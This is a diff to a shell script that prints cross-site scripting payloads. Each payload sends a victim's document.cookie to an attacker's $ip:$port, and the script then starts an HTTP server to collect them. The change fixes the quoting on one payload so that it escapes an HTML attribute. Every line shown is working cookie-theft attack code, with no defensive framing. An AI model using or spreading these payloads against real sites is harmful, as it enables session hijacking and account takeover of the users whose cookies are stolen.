@@ -38,7 +38,7 @@ echo "<script>var i=new Image;i.src='$ip:$port/?'+document.cookie;</script>"
 echo -e "\n---------------------------------------------------------------------------------------\n"
 echo "<img src=x onerror=this.src='http://$ip:$port/?'+document.cookie;>"
 echo -e "\n---------------------------------------------------------------------------------------\n"
-echo "><script>document.location='http://$ip:$port/?'+document.cookie</script>"
+echo -e "\"><script>document.location='http://$ip:$port/?'+document.cookie</script>"
 echo -e "\n---------------------------------------------------------------------------------------\n"
 
 #Start HTTP Server
